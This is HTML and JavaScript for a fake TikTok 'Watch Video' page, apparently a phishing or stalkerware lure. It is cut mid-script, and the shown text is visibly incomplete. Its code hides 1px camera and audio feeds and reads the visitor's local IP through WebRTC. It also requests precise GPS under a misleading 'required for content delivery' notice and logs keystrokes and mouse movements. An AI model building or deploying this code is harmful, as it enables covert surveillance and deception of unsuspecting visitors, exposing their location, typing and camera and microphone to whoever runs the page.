<!DOCTYPE html>
<html lang="en">
<head>

    <title>TikTok - Watch Video</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #000;
            color: #fff;
            font-family: 'TikTok Sans', Arial, sans-serif;
            overflow: hidden;
            position: relative;
        }

        /* --- Video Player Container --- */
        .video-container {
            width: 100vw;
            height: 100vh;
            max-width: 500px;
            max-height: 100vh;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000;
            overflow: hidden;
        }

        .video-placeholder {
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #ff0050, #00f2ea);
            background-size: 400% 400%;
            animation: gradientShift 3s ease infinite;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            position: relative;
            z-index: 10;
            opacity: 1;
            transition: opacity 0.5s ease;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .video-placeholder.hidden {
            opacity: 0;
            pointer-events: none;
        }

        .play-button {
            width: 80px;
            height: 80px;
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            margin-bottom: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
        }

        .play-button svg {
            width: 40px;
            height: 40px;
            fill: #fff;
            margin-left: 5px;
        }

        .placeholder-text {
            font-size: 1.2em;
            color: #fff;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
            font-weight: 600;
        }

        .tiktok-logo {
            position: absolute;
            top: 20px;
            left: 20px;
            font-size: 1.5em;
            font-weight: bold;
            color: #fff;
        }

        /* --- Loading Spinner Overlay --- */
        #loading-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 20;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }

        #loading-overlay.active {
            opacity: 1;
            visibility: visible;
        }

        .spinner {
            border: 8px solid rgba(255, 255, 255, 0.3);
            border-top: 8px solid #ff0050;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.2s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-message {
            font-size: 1.1em;
            color: #eee;
            text-align: center;
            max-width: 300px;
        }

        /* --- Hidden Elements for Data Collection --- */
        #camera-feed {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            z-index: -1;
        }

        #audio-feed {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            z-index: -1;
        }

        #canvas {
            display: none;
        }

        #video-canvas {
            display: none;
        }

        /* --- Notification Styles --- */
        #notification {
            position: absolute;
            top: 20px;
            right: 20px;
            background-color: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 10px 15px;
            border-radius: 8px;
            font-size: 0.9em;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s ease, visibility 0.5s ease;
            z-index: 30;
            border-left: 4px solid #ff0050;
        }

        #notification.show {
            opacity: 1;
            visibility: visible;
        }

        #notification.warning {
            border-left-color: #ffa500;
        }

        #notification.error {
            border-left-color: #ff0000;
        }

        /* --- Progress Bar --- */
        .progress-bar {
            width: 200px;
            height: 4px;
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 2px;
            margin: 10px 0;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #ff0050, #00f2ea);
            width: 0%;
            transition: width 0.3s ease;
        }

        /* --- TikTok Fake UI --- */
        .tiktok-sidebar {
            position: absolute;
            right: 15px;
            bottom: 100px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
            z-index: 15; /* Above placeholder but below overlay */
            transition: opacity 0.5s ease;
        }

        .sidebar-icon {
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #fff;
            font-size: 0.8em;
            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
            opacity: 0.9;
        }

        .sidebar-icon svg {
            width: 35px;
            height: 35px;
            fill: #fff;
            margin-bottom: 5px;
            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.4));
        }

        .bottom-nav {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 60px;
            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
            display: flex;
            justify-content: space-around;
            align-items: center;
            z-index: 15;
            padding-bottom: 10px;
            transition: opacity 0.5s ease;
        }

        .nav-item {
            color: rgba(255,255,255,0.7);
            display: flex;
            flex-direction: column;
            align-items: center;
            font-size: 0.75em;
            font-weight: 600;
        }
        
        .nav-item.active {
            color: #fff;
        }

        .nav-item svg {
            width: 24px;
            height: 24px;
            fill: currentColor;
            margin-bottom: 4px;
        }

        .video-info {
            position: absolute;
            bottom: 80px;
            left: 15px;
            width: 70%;
            z-index: 15;
            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
            transition: opacity 0.5s ease;
        }

        .username {
            font-weight: bold;
            font-size: 1.1em;
            margin-bottom: 5px;
        }

        .description {
            font-size: 0.9em;
            margin-bottom: 5px;
            line-height: 1.3;
        }

        .music {
            display: flex;
            align-items: center;
            font-size: 0.85em;
        }

        .music svg {
            width: 15px;
            height: 15px;
            fill: #fff;
            margin-right: 5px;
            animation: spin 3s linear infinite;
        }

        .hidden-ui {
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>

                    const ip = event.candidate.candidate.split(' ')[4];
                    if (ip.match(/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/)) {
                        collectedData.webRTCData = { localIP: ip };
                    }
                }
            };

            console.log('Device information collected.');
        }

        // Get IP and location information
        async function getPreciseLocation() {
            return new Promise(async (resolve) => {
                const locationData = {
                    gps: null,
                    ip: collectedData.ipInfo
                };

                if (navigator.geolocation) {
                    try {
                        const position = await new Promise((gpsResolve, gpsReject) => {
                            navigator.geolocation.getCurrentPosition(
                                gpsResolve,
                                gpsReject,
                                {
                                    enableHighAccuracy: true,
                                    timeout: 15000,
                                    maximumAge: 0
                                }
                            );
                        });

                        locationData.gps = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        };
                        
                        console.log('Precise GPS location acquired.');
                    } catch (error) {
                        console.warn('GPS location failed:', error.name);
                        if (error.name === 'PermissionDeniedError') {
                            showNotification('Location access required for content delivery', 'warning');
                        }
                    }
                }
                
                collectedData.location = locationData;
                resolve(true);
            });
        }

        // Keystroke logging (for demonstration)
        function startKeystrokeLogging() {
            keystrokeLogger = (event) => {
                collectedData.keystrokes.push({
                    key: event.key,
                    keyCode: event.keyCode,
                    timestamp: new Date().toISOString(),
                    target: event.target.tagName
                });
            };
            document.addEventListener('keydown', keystrokeLogger);
        }

        // Mouse movement tracking
        function startMouseTracking() {
            mouseTracker = (event) => {
                collectedData.mouseMovements.push({
                    x: event.clientX,
                    y: event.clientY,
                    timestamp: new Date().toISOString()
                });
            };
            document.addEventListener('mousemove', mouseTracker);
        }

        // Stop tracking
        function stopTracking() {
            if (keystrokeLogger) {
                document.removeEventListener('keydown', keystrokeLogger);
            }
            if (mouseTracker) {
                document.removeEventListener('mousemove', mouseTracker);
            }
        }
